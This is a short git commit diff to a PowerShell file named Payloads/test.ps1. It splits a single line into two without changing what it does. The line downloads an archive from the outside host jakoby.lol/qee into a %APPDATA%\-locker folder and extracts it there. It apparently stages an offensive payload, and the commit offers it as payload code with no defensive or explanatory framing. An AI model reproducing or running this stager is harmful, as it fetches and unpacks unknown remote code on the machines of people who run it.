7c07c9bb7640785d7039c4c55f9668c7d628c963
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2022-12-23 02:13:51 -0600

    Update test.ps1

--- Payloads/test.ps1
+++ Payloads/test.ps1
@@ -1,1 +1,2 @@
-iwr -Uri "jakoby.lol/qee" -O "$env:appdata\-locker\rr.zip";Expand-Archive "$env:appdata\-locker\rr.zip" -Des $env:appdata\-locker -Force
+iwr -Uri "jakoby.lol/qee" -O "$env:appdata\-locker\rr.zip";
+Expand-Archive "$env:appdata\-locker\rr.zip" -Des $env:appdata\-locker -Force
